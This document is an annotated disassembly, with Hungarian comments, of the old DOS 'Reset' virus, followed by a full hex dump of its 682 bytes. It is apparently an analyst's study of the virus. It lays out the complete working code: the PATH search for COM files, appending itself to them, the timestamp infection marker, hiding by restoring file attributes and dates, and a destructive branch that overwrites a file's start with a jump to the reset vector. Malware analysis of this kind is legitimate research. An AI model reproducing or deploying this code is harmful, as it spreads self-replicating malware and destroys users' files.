Reset virus. Size 682 byte Hex: 02ac byte.		Comment by Leslie Kovari
								   (41) 21-033



Unassemble list:

114E:0100 E91F00	JMP	0122			;ugras a virus kezdetere
114E:0103 49		DEC	CX
114E:0104 60		DB	60
114E:0105 61		DB	61
114E:0106 6D		DB	6D
114E:0107 206120	AND	[BX+DI+20],AH
114E:010A 52		PUSH	DX
114E:010B 65		DB	65
114E:010C 7365		JNB	0173
114E:010E 7420		JZ	0130
114E:0110 56		PUSH	SI
114E:0111 49		DEC	CX
114E:0112 52		PUSH	DX
114E:0113 55		PUSH	BP
114E:0114 53		PUSH	BX
114E:0115 2124		AND	[SI],SP
114E:0117 BA0301	MOV	DX,0103 		;az eredeti fertozott
							;program kezdete
114E:011A B409		MOV	AH,09
114E:011C CD21		INT	21			;uzenet kepernyore
114E:011E B400		MOV	AH,00
114E:0120 CD20		INT	20			;exit to DOS

114E:0122 51		PUSH	CX			;stack-en marad

			;a kovetkezo utasitas operandusat fertozeskor
			;allitja be, igy mindig a helyes cimre mutat

114E:0123 BA1B03	MOV	DX,031B
114E:0126 FC		CLD				;elore
114E:0127 8BF2		MOV	SI,DX
114E:0129 81C60A00	ADD	SI,000A 		;SI=031b eredeti 3 byte
114E:012D BF0001	MOV	DI,0100 		;program eleje
114E:0130 B90300	MOV	CX,0003 		;3 byte
114E:0133 F3		REPZ
114E:0134 A4		MOVSB				;eredeti JMP 117
							;visszamasolasa
114E:0135 8BF2		MOV	SI,DX
114E:0137 B430		MOV	AH,30
114E:0139 CD21		INT	21			;DOS verzio szam lekerd.
114E:013B 3C00		CMP	AL,00
114E:013D 7503		JNZ	0142
114E:013F E9C701	JMP	0309			;ha 00-as verzio akkor
							;nem fertoz a virus s
							;futtatja az eredeti
							;programot
114E:0142 06		PUSH	ES
114E:0143 B42F		MOV	AH,2F
114E:0145 CD21		INT	21			;DTA. lekerdezese
114E:0147 899C0000	MOV	[SI+0000],BX		;BX= 0080 offset
114E:014B 8C840200	MOV	[SI+0002],ES		;eredeti DTA. mentese
114E:014F 07		POP	ES

			;DTA. beallitasa az ENTRY cimere /dir.-bol/
			;ide masolja a find first a file adatait

114E:0150 BA5F00	MOV	DX,005F 		;DX=037a
114E:0153 90		NOP
114E:0154 03D6		ADD	DX,SI
114E:0156 B41A		MOV	AH,1A
114E:0158 CD21		INT	21			;DTA. letrehozasa
							;037a-tol uj cimre
114E:015A 06		PUSH	ES
114E:015B 56		PUSH	SI
114E:015C 8E062C00	MOV	ES,[002C]		;kornyezet szegmense
114E:0160 BF0000	MOV	DI,0000 		;elejetol ES:DI fog a
							;kovetkezo dir.-ra mu-
							;tatni
114E:0163 5E		POP	SI
114E:0164 56		PUSH	SI
114E:0165 81C61A00	ADD	SI,001A 		;ezen a cimen levo
							;stringet keresi a
							;kornyezetbe PATH
114E:0169 AC		LODSB				;AL=DS:[SI],SI++
114E:016A B90080	MOV	CX,8000 		;32 kbyte
114E:016D F2		REPNZ
114E:016E AE		SCASB				;megkeresi a kovetke-
							;zo P betut
114E:016F B90400	MOV	CX,0004 		;a PATH feliratot keresi
114E:0172 AC		LODSB
114E:0173 AE		SCASB				;betunkent hasonlitja
114E:0174 75ED		JNZ	0163			;ha nem egyezik a DI.
							;karakter /kov.betu/
114E:0176 E2FA		LOOP	0172			;egyezik beolvassa es
							;osszehasonlitja a tobbi
							;betut is
114E:0178 5E		POP	SI
114E:0179 07		POP	ES			;ES:DI mutat az elso
							;PATH-ra
114E:017A 89BC1600	MOV	[SI+0016],DI		;a PATH= szo utani file
							;spec. cimenek mentese
							;PATH mutato
114E:017E 8BFE		MOV	DI,SI			;SI=031b
114E:0180 81C71F00	ADD	DI,001F 		;DI=033a
114E:0184 8BDE		MOV	BX,SI			;BX=031b ezutan BX mu-
							;tat az adatokra
114E:0186 81C61F00	ADD	SI,001F 		;SI=033a
114E:018A 8BFE		MOV	DI,SI			;DI=033a
114E:018C EB3A		JMP	01C8

			;A kovetkezo PATH-ban megadott aldirectoryt
			;File Path-ra masolja, igy a kovetkezo file-t
			;ebben az aldirectoryban keresi

114E:018E 83BC160000	CMP	WORD PTR [SI+0016],+00	;
114E:0193 7503		JNZ	0198
114E:0195 E96301	JMP	02FB			;ha nincs osveny megadva
114E:0198 1E		PUSH	DS
114E:0199 56		PUSH	SI
114E:019A 26		ES:
114E:019B 8E1E2C00	MOV	DS,[002C]		;kornyezet szegmense
114E:019F 8BFE		MOV	DI,SI			;DI=033a
114E:01A1 26		ES:
114E:01A2 8BB51600	MOV	SI,[DI+0016]		;a kornyezetbol a path
							;masolasa ha az aktualis
							;konyvtarban nem talalt
							;fertozheto file-t
							;a PATH= utanra mutat
							;az SI
114E:01A6 81C71F00	ADD	DI,001F
114E:01AA AC		LODSB				;beolvas a kornyezetbol
							;a 0029. byte-ot
114E:01AB 3C3B		CMP	AL,3B			;pontosvesszo ?
114E:01AD 740A		JZ	01B9			;igen
114E:01AF 3C00		CMP	AL,00			;PATH vege ? nem lesz
							;tobb
114E:01B1 7403		JZ	01B6			;igen
114E:01B3 AA		STOSB				;letarol 033a-tol
114E:01B4 EBF4		JMP	01AA

114E:01B6 BE0000	MOV	SI,0000
114E:01B9 5B		POP	BX			;BX=regi SI BX mutat
							;az adatokra
114E:01BA 1F		POP	DS
114E:01BB 89B71600	MOV	[BX+0016],SI

			;a kovetkezo PATH-ban adott dir. mar atmasolva

114E:01BF 807DFF5C	CMP	BYTE PTR [DI-01],5C	; \ jel ?
114E:01C3 7403		JZ	01C8			;igen
114E:01C5 B05C		MOV	AL,5C			;egyebkent \ iras

			;egy aldir. kiertekelese, eloszor az aktualis, majd
			;a file path -ra masolt aldir. vegignezese, fertozes
			;DI a file path-ba irt aldir. neve utani poz.-ra mu-
			;tat

			;COM file keresese

114E:01C7 AA		STOSB				;\ jel beirasa
114E:01C8 89BF1800	MOV	[BX+0018],DI		;ide kell majd a
							;file nevet masolni,
							;az aldir. neve utan
114E:01CC 8BF3		MOV	SI,BX			;SI=031b   DI=033d
114E:01CE 81C61000	ADD	SI,0010 		;SI=032b
114E:01D2 B90600	MOV	CX,0006
114E:01D5 F3		REPZ
114E:01D6 A4		MOVSB				;a *.COM szoveg beirasa
							;a PATH= szoveg utan
114E:01D7 8BF3		MOV	SI,BX
114E:01D9 B44E		MOV	AH,4E			;a file adatai a DTA.
							;alltal foglalt teru-
							;letre
114E:01DB BA1F00	MOV	DX,001F
114E:01DE 90		NOP
114E:01DF 03D6		ADD	DX,SI
114E:01E1 B90300	MOV	CX,0003
114E:01E4 CD21		INT	21			;elso file bejegyzes ke-
							;resese, az it. aktivi-
							;zalasa utan felhozza a
							;filemeretet, attrib.ot
							;keletkezes datumat s
							;idejet is!
114E:01E6 EB04		JMP	01EC			;vizsgalatra
114E:01E8 B44F		MOV	AH,4F
114E:01EA CD21		INT	21			;kovetkezo file bejegy-
							;zes keresese
114E:01EC 7302		JNB	01F0			;ha nincs hiba
114E:01EE EB9E		JMP	018E			;hiba eseten -ha nem
							;talal tobb COM file-t
							;mas aldirt keres
			;mar talalt COM file-t, az adataival az entry fel
			;van toltve, a file ellenorzese es fertozese
			;kovetkezik

114E:01F0 8B847500	MOV	AX,[SI+0075]		;a keletkezesi ido AX-be
							;SI=0390
114E:01F4 241F		AND	AL,1F			;maszk 31 -el
114E:01F6 3C1F		CMP	AL,1F			;ha 31 akkor mar ferto-
							;zott a file!
114E:01F8 74EE		JZ	01E8			;fertozott kovetkezo
							;file-t keresi
114E:01FA 81BC790000FA	CMP	WORD PTR [SI+0079],FA00
114E:0200 77E6		JA	01E8			;ha > a file meret
							;64000 byte-nal
114E:0202 83BC79000A	CMP	WORD PTR [SI+0079],+0A
114E:0207 72DF		JB	01E8			;ha < 10 byte nal
114E:0209 8BBC1800	MOV	DI,[SI+0018]		;DI=033a

			;megvan a kivalasztott file
			;a file nevet a filespec utan kell masolni

114E:020D 56		PUSH	SI			;DI mutat a filespec.re,
							;PATH=*.COM
114E:020E 81C67D00	ADD	SI,007D 		;SI=0398

114E:0212 AC		LODSB				;atmasolja a filenevet
							;/megkeresett elso v.
							;x.edik bejegyzest/
114E:0213 AA		STOSB
114E:0214 3C00		CMP	AL,00			;vegere ert ? nevle-
							;zaro nullaig masol
114E:0216 75FA		JNZ	0212			;nem
114E:0218 5E		POP	SI			;SI ujra az adatokra mu-
							;tat
			;a file egyes eredeti informacioinak megorzese
			;hogy a fertozese ne tunjon fel
			;minek a file ATTR. megegyszer lekerdezni?

114E:0219 B80043	MOV	AX,4300
114E:021C BA1F00	MOV	DX,001F 		;DS:DX = filespec.
114E:021F 90		NOP
114E:0220 03D6		ADD	DX,SI			;DX=031b
114E:0222 CD21		INT	21			;attributum lekerdezese
							;7.6.5.4.3.2.1.0.
							;x x a d v s h r
114E:0224 898C0800	MOV	[SI+0008],CX		;attributum
114E:0228 B80143	MOV	AX,4301
114E:022B 81E1FEFF	AND	CX,FFFE 		;ha Read Only akkor ARC.
							;ra valtoztatja
114E:022F BA1F00	MOV	DX,001F
114E:0232 90		NOP
114E:0233 03D6		ADD	DX,SI			;DX=033a
114E:0235 CD21		INT	21			;attributum beallitasa

			;file nyitasa

114E:0237 B8023D	MOV	AX,3D02
114E:023A BA1F00	MOV	DX,001F
114E:023D 90		NOP
114E:023E 03D6		ADD	DX,SI			;DS:DX = filespec.
114E:0240 CD21		INT	21			;file nyitasa I/O ra
114E:0242 7303		JNB	0247
114E:0244 E9A500	JMP	02EC			;hiba eseten nincs
							;fertozes
114E:0247 8BD8		MOV	BX,AX			;handle

			;a file idejenek lekerdezese de ez is megtalalhato az
			;ENTRY teruleten

114E:0249 B80057	MOV	AX,5700
114E:024C CD21		INT	21			;file letrehozasi datum
							;es ido bekerese
114E:024E 898C0400	MOV	[SI+0004],CX		;ido	CH-ora CL-perc
								DH-sec DL-1/100
114E:0252 89940600	MOV	[SI+0006],DX		;datum
114E:0256 B42C		MOV	AH,2C
114E:0258 CD21		INT	21			;rendszerido bekerese

			;annak eldontese hogy a filet tonkretegye-e
			;ha a masodperc 7 akkor tonkreteszi /aktualis/

114E:025A 80E607	AND	DH,07			;sec = 7 ?
114E:025D 7510		JNZ	026F			;nem - nem tesz tonkre!

			;file tonkretetele

114E:025F B440		MOV	AH,40
114E:0261 B90500	MOV	CX,0005
114E:0264 8BD6		MOV	DX,SI			;reset
114E:0266 81C28A00	ADD	DX,008A 		;DX=03a7 : JMP F000:FFF0
114E:026A CD21		INT	21			;file elejere ir 5 byte
							;-ot a RESET re ugrast!
114E:026C EB65		JMP	02D3

114E:026E 90		NOP

			;fertozes
			;az eredeti 3 byte megorzese hogy kesobb meg futtatni
			;lehessen

114E:026F B43F		MOV	AH,3F
114E:0271 B90300	MOV	CX,0003
114E:0274 BA0A00	MOV	DX,000A
114E:0277 90		NOP
114E:0278 03D6		ADD	DX,SI			;DS:DX = puffer cima DTA
114E:027A CD21		INT	21			;a program eredeti elso
							;3 byte-jat beolvassa
114E:027C 7255		JB	02D3			;ha hiba van
114E:027E 3D0300	CMP	AX,0003 		;megvolt a 3 byte ?
114E:0281 7550		JNZ	02D3			;nem

			;file vegere allas az uj cimek kiszamitasa

114E:0283 B80242	MOV	AX,4202
114E:0286 B90000	MOV	CX,0000
114E:0289 BA0000	MOV	DX,0000
114E:028C CD21		INT	21			;file vegere pozicional
114E:028E 7243		JB	02D3			;ha hiba volt -nem
							;nagyon lehet hiba!

			;file elejere irando JMP operandus kiszamitasa

114E:0290 8BC8		MOV	CX,AX			;AX-ben filehossz
114E:0292 2D0300	SUB	AX,0003 		;AX-ben eltolas a JMP
							;utasitashoz amit a
							;file elejere fog irni
							;igy a JMP a file mos-
							;tani vege utani bytera
							;fog mutatni
114E:0295 89840E00	MOV	[SI+000E],AX		;JMP cim

			;az uj file-on beluli adatterulet cimenek ki-
			;szamitasa es beallitasa

114E:0299 81C1F902	ADD	CX,02F9 		;az uj file-on beluli
							;adatteruletre mutat
114E:029D 8BFE		MOV	DI,SI
114E:029F 81EFF701	SUB	DI,01F7 		;virus elso utasitasa-
							;nak operandusanak
							;cime
114E:02A3 890D		MOV	[DI],CX 		;ide irja az adatterulet
							;cimet

			;file moge masolja magat
			;filemutato a file vegere mutat

114E:02A5 B440		MOV	AH,40
114E:02A7 B98802	MOV	CX,0288 		;a VIRUS hossza
114E:02AA 8BD6		MOV	DX,SI			;virus elso bytejara
							;mutat
114E:02AC 81EAF901	SUB	DX,01F9
114E:02B0 CD21		INT	21			;a FERTOZES onmagat a
							;program a fertozendo
							;program moge irja
114E:02B2 721F		JB	02D3			;hiba eseten
114E:02B4 3D8802	CMP	AX,0288 		;kiirta onmagat ?
114E:02B7 751A		JNZ	02D3			;igen

			;az elso 3 byte atallitasa, egy file
			;vegere mutato ugro utasitasra

114E:02B9 B80042	MOV	AX,4200
114E:02BC B90000	MOV	CX,0000
114E:02BF BA0000	MOV	DX,0000
114E:02C2 CD21		INT	21			;file pointer a vegere
114E:02C4 720D		JB	02D3			;ha volt hiba -nem le-
							;het hiba!
114E:02C6 B440		MOV	AH,40
114E:02C8 B90300	MOV	CX,0003
114E:02CB 8BD6		MOV	DX,SI
114E:02CD 81C20D00	ADD	DX,000D 		;DX=0329 ugro utasitasra
							;mutat
114E:02D1 CD21		INT	21			;3 byte kiirasa a fileba

			;az eredeti ido -mar a fertozesjelzessel egyutt-
			;visszaallitasa

114E:02D3 8B940600	MOV	DX,[SI+0006]		;datum
114E:02D7 8B8C0400	MOV	CX,[SI+0004]		;ido
114E:02DB 81E1E0FF	AND	CX,FFE0 		;sec=0 -felesleges!
114E:02DF 81C91F00	OR	CX,001F 		;sec=1f azaz 31, igy
							;jelzi hogy mar ferto-
							;zott egy file a SEC.
							;-et 31-re allitja a
							;file bejegyzesben
							; hour |  min. | sec.
							;1111 1|111 111|0 0000
114E:02E3 B80157	MOV	AX,5701
114E:02E6 CD21		INT	21			;file keletk. ido beall.

			;file zarasa

114E:02E8 B43E		MOV	AH,3E
114E:02EA CD21		INT	21			;file zarasa

			;eredeti attributum visszaallitasa

114E:02EC B80143	MOV	AX,4301
114E:02EF 8B8C0800	MOV	CX,[SI+0008]		;CX=0020 /ARC./
114E:02F3 BA1F00	MOV	DX,001F
114E:02F6 90		NOP

			;DTA. visszaallitasa az eredeti cimre

114E:02F7 03D6		ADD	DX,SI
114E:02F9 CD21		INT	21			;file attr. beallitasa
114E:02FB 1E		PUSH	DS
114E:02FC B41A		MOV	AH,1A
114E:02FE 8B940000	MOV	DX,[SI+0000]
114E:0302 8E9C0200	MOV	DS,[SI+0002]
114E:0306 CD21		INT	21			;DTA. megadasa
114E:0308 1F		POP	DS

			;az eredeti program futtatasa

114E:0309 59		POP	CX
114E:030A 33C0		XOR	AX,AX			;reg. nullazasa
114E:030C 33DB		XOR	BX,BX
114E:030E 33D2		XOR	DX,DX
114E:0310 33F6		XOR	SI,SI
114E:0312 BF0001	MOV	DI,0100
114E:0315 57		PUSH	DI			;elteszi a 0100 offsetet
							;hogy a RET elo tudja
							;venni es odaugrik
114E:0316 33FF		XOR	DI,DI
114E:0318 C2FFFF	RET	FFFF			;ugras a 0100-as offset-
							;re, ott mar az eredeti
							;JMP 117 utasitas van,
							;igy vegrehajtodik az
							;eredeti prg.
							;SP- hogy minek ?
114E:031B 800046	ADD	BYTE PTR [BX+SI],46
114E:031E 0D2001	OR	AX,0120
114E:0321 2100		AND	[BX+SI],AX
114E:0323 2000		AND	[BX+SI],AL
114E:0325 EB15		JMP	033C
114E:0327 90		NOP
114E:0328 E91F00	JMP	034A
114E:032B 2A2E434F	SUB	CH,[4F43]
114E:032F 4D		DEC	BP
114E:0330 0028		ADD	[BX+SI],CH
114E:0332 004703	ADD	[BX+03],AL
114E:0335 50		PUSH	AX
114E:0336 41		INC	CX
114E:0337 54		PUSH	SP
114E:0338 48		DEC	AX
114E:0339 3D5245	CMP	AX,4552
114E:033C 53		PUSH	BX
114E:033D 45		INC	BP
114E:033E 54		PUSH	SP
114E:033F 2E		CS:
114E:0340 43		INC	BX
114E:0341 4F		DEC	DI
114E:0342 4D		DEC	BP
114E:0343 0000		ADD	[BX+SI],AL
114E:0345 0000		ADD	[BX+SI],AL
114E:0347 4D		DEC	BP
114E:0348 004449	ADD	[SI+49],AL
114E:034B 54		PUSH	SP
114E:034C 2E		CS:
114E:034D 43		INC	BX
114E:034E 4F		DEC	DI
114E:034F 4D		DEC	BP
114E:0350 0000		ADD	[BX+SI],AL
114E:0352 2020		AND	[BX+SI],AH
114E:0354 2020		AND	[BX+SI],AH
114E:0356 2020		AND	[BX+SI],AH
114E:0358 2020		AND	[BX+SI],AH
114E:035A 2020		AND	[BX+SI],AH
114E:035C 2020		AND	[BX+SI],AH
114E:035E 2020		AND	[BX+SI],AH
114E:0360 2020		AND	[BX+SI],AH
114E:0362 2020		AND	[BX+SI],AH
114E:0364 2020		AND	[BX+SI],AH
114E:0366 2020		AND	[BX+SI],AH
114E:0368 2020		AND	[BX+SI],AH
114E:036A 2020		AND	[BX+SI],AH
114E:036C 2020		AND	[BX+SI],AH
114E:036E 2020		AND	[BX+SI],AH
114E:0370 2020		AND	[BX+SI],AH
114E:0372 2020		AND	[BX+SI],AH
114E:0374 2020		AND	[BX+SI],AH
114E:0376 2020		AND	[BX+SI],AH
114E:0378 2020		AND	[BX+SI],AH
114E:037A 013F		ADD	[BX],DI
114E:037C 3F		AAS
114E:037D 3F		AAS
114E:037E 3F		AAS
114E:037F 3F		AAS
114E:0380 3F		AAS
114E:0381 3F		AAS
114E:0382 3F		AAS
114E:0383 43		INC	BX
114E:0384 4F		DEC	DI
114E:0385 4D		DEC	BP
114E:0386 0301		ADD	AX,[BX+DI]
114E:0388 0000		ADD	[BX+SI],AL
114E:038A 002E8B26	ADD	[268B],CH
114E:038E 68		DB	68
114E:038F 2020		AND	[BX+SI],AH
114E:0391 0121		ADD	[BX+DI],SP
114E:0393 0022		ADD	[BP+SI],AH
114E:0395 0000		ADD	[BX+SI],AL
114E:0397 005245	ADD	[BP+SI+45],DL
114E:039A 53		PUSH	BX
114E:039B 45		INC	BP
114E:039C 54		PUSH	SP
114E:039D 2E		CS:
114E:039E 43		INC	BX
114E:039F 4F		DEC	DI
114E:03A0 4D		DEC	BP
114E:03A1 0000		ADD	[BX+SI],AL
114E:03A3 4D		DEC	BP
114E:03A4 00EA		ADD	DL,CH
114E:03A6 F0		LOCK
114E:03A7 FF00		INC	WORD PTR [BX+SI]
114E:03A9 F0		LOCK
114E:03AA 16		PUSH	SS
114E:03AB 7C14		JL	03C1

Dump list:

114E:0000  CD 20 00 A0 00 9A F0 FE-1D F0 F4 02 84 0D 2F 03   . ............/.
114E:0010  84 0D BC 02 84 0D 4C 0D-01 03 01 00 02 FF FF FF   ......L.........
114E:0020  FF FF FF FF FF FF FF FF-FF FF FF FF 44 11 4C 01   ............D.L.
114E:0030  BE 10 14 00 18 00 4E 11-FF FF FF FF 00 00 00 00   ......N.........
114E:0040  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
114E:0050  CD 21 CB 00 00 00 00 00-00 00 00 00 00 20 20 20   .!...........
114E:0060  20 20 20 20 20 20 20 20-00 00 00 00 00 20 20 20	     .....
114E:0070  20 20 20 20 20 20 20 20-00 00 00 00 00 00 00 00	     ........
114E:0080  01 20 0D 65 73 65 74 76-2E 63 6F 6D 20 0D 63 3A   . .esetv.com .c:
114E:0090  0D 65 6B 5C 64 62 61 73-65 3B 63 3A 5C 6E 79 65   .ek\dbase;c:\nye
114E:00A0  6C 76 65 6B 5C 63 6C 69-70 70 65 72 3B 63 3A 5C   lvek\clipper;c:\
114E:00B0  6E 79 65 6C 76 65 6B 5C-66 6C 61 73 68 3B 63 3A   nyelvek\flash;c:
114E:00C0  5C 6E 79 65 6C 76 65 6B-5C 70 61 73 63 61 6C 3B   \nyelvek\pascal;
114E:00D0  63 3A 5C 75 74 69 6C 0D-00 00 00 00 00 00 00 00   c:\util.........
114E:00E0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
114E:00F0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00   ................
114E:0100  E9 1F 00 49 60 61 6D 20-61 20 52 65 73 65 74 20   ...I`am a Reset
114E:0110  56 49 52 55 53 21 24 BA-03 01 B4 09 CD 21 B4 00   VIRUS!$......!..
114E:0120  CD 20 51 BA 1B 03 FC 8B-F2 81 C6 0A 00 BF 00 01   . Q.............
114E:0130  B9 03 00 F3 A4 8B F2 B4-30 CD 21 3C 00 75 03 E9   ........0.!<.u..
114E:0140  C7 01 06 B4 2F CD 21 89-9C 00 00 8C 84 02 00 07   ..../.!.........
114E:0150  BA 5F 00 90 03 D6 B4 1A-CD 21 06 56 8E 06 2C 00   ._.......!.V..,.
114E:0160  BF 00 00 5E 56 81 C6 1A-00 AC B9 00 80 F2 AE B9   ...^V...........
114E:0170  04 00 AC AE 75 ED E2 FA-5E 07 89 BC 16 00 8B FE   ....u...^.......
114E:0180  81 C7 1F 00 8B DE 81 C6-1F 00 8B FE EB 3A 83 BC   .............:..
114E:0190  16 00 00 75 03 E9 63 01-1E 56 26 8E 1E 2C 00 8B   ...u..c..V&..,..
114E:01A0  FE 26 8B B5 16 00 81 C7-1F 00 AC 3C 3B 74 0A 3C   .&.........<;t.<
114E:01B0  00 74 03 AA EB F4 BE 00-00 5B 1F 89 B7 16 00 80   .t.......[......
114E:01C0  7D FF 5C 74 03 B0 5C AA-89 BF 18 00 8B F3 81 C6   }.\t..\.........
114E:01D0  10 00 B9 06 00 F3 A4 8B-F3 B4 4E BA 1F 00 90 03   ..........N.....
114E:01E0  D6 B9 03 00 CD 21 EB 04-B4 4F CD 21 73 02 EB 9E   .....!...O.!s...
114E:01F0  8B 84 75 00 24 1F 3C 1F-74 EE 81 BC 79 00 00 FA   ..u.$.<.t...y...
114E:0200  77 E6 83 BC 79 00 0A 72-DF 8B BC 18 00 56 81 C6   w...y..r.....V..
114E:0210  7D 00 AC AA 3C 00 75 FA-5E B8 00 43 BA 1F 00 90   }...<.u.^..C....
114E:0220  03 D6 CD 21 89 8C 08 00-B8 01 43 81 E1 FE FF BA   ...!......C.....
114E:0230  1F 00 90 03 D6 CD 21 B8-02 3D BA 1F 00 90 03 D6   ......!..=......
114E:0240  CD 21 73 03 E9 A5 00 8B-D8 B8 00 57 CD 21 89 8C   .!s........W.!..
114E:0250  04 00 89 94 06 00 B4 2C-CD 21 80 E6 07 75 10 B4   .......,.!...u..
114E:0260  40 B9 05 00 8B D6 81 C2-8A 00 CD 21 EB 65 90 B4   @..........!.e..
114E:0270  3F B9 03 00 BA 0A 00 90-03 D6 CD 21 72 55 3D 03   ?..........!rU=.
114E:0280  00 75 50 B8 02 42 B9 00-00 BA 00 00 CD 21 72 43   .uP..B.......!rC
114E:0290  8B C8 2D 03 00 89 84 0E-00 81 C1 F9 02 8B FE 81   ..-.............
114E:02A0  EF F7 01 89 0D B4 40 B9-88 02 8B D6 81 EA F9 01   ......@.........
114E:02B0  CD 21 72 1F 3D 88 02 75-1A B8 00 42 B9 00 00 BA   .!r.=..u...B....
114E:02C0  00 00 CD 21 72 0D B4 40-B9 03 00 8B D6 81 C2 0D   ...!r..@........
114E:02D0  00 CD 21 8B 94 06 00 8B-8C 04 00 81 E1 E0 FF 81   ..!.............
114E:02E0  C9 1F 00 B8 01 57 CD 21-B4 3E CD 21 B8 01 43 8B   .....W.!.>.!..C.
114E:02F0  8C 08 00 BA 1F 00 90 03-D6 CD 21 1E B4 1A 8B 94   ..........!.....
114E:0300  00 00 8E 9C 02 00 CD 21-1F 59 33 C0 33 DB 33 D2   .......!.Y3.3.3.
114E:0310  33 F6 BF 00 01 57 33 FF-C2 FF FF 80 00 46 0D 20   3....W3......F.
114E:0320  01 21 00 20 00 EB 15 90-E9 1F 00 2A 2E 43 4F 4D   .!. .......*.COM
114E:0330  00 28 00 47 03 50 41 54-48 3D 52 45 53 45 54 2E   .(.G.PATH=RESET.
114E:0340  43 4F 4D 00 00 00 00 4D-00 44 49 54 2E 43 4F 4D   COM....M.DIT.COM
114E:0350  00 00 20 20 20 20 20 20-20 20 20 20 20 20 20 20   ..
114E:0360  20 20 20 20 20 20 20 20-20 20 20 20 20 20 20 20
114E:0370  20 20 20 20 20 20 20 20-20 20 01 3F 3F 3F 3F 3F	       .?????
114E:0380  3F 3F 3F 43 4F 4D 03 01-00 00 00 2E 8B 26 68 20   ???COM.......&h
114E:0390  20 01 21 00 22 00 00 00-52 45 53 45 54 2E 43 4F    .!."...RESET.CO
114E:03A0  4D 00 00 4D 00 EA F0 FF-00 F0 16 7C 14	     M..M.......|.

